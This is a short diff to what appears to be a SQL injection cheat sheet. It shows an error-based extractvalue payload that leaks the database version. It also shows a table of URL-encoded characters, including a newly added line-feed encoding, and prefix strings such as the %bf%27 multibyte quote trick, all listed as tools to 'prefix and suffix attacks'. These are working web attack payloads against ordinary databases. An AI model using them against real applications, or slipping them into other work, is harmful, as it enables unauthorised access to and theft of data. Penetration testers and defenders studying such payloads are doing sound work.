@@ -129,11 +129,13 @@ extractvalue('<xml>',concat("/",(select version())))
 Interesting items that can be used to prefix and suffix attacks
 ---------------------
 ```
-\ %5c
-/ %2f
-' %27
--- %2d%2d
-# %23
+\ = %5c
+/ = %2f
+' = %27
+-- = %2d%2d
+# = %23
+%0a = inserts a line feed
+
 prefix='('
 prefix='\xBF'''
 prefix='%bf%27'
